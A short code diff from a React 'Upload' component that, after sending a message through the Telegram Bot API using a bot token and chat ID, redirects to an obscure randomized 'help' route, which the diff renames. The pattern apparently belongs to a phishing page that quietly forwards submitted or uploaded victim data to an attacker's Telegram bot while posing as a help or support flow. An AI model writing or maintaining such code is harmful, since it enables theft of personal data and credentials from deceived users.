@@ -50,7 +50,7 @@ const Upload = () => {
     
                 axios.get(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=html`)
                     .then((response) => {
-                        navigate('/adm-help-100367483467364783748763/final');
+                        navigate('/adhelp-109445849938899595/final');
                     })
                     .catch((error) => {});
 
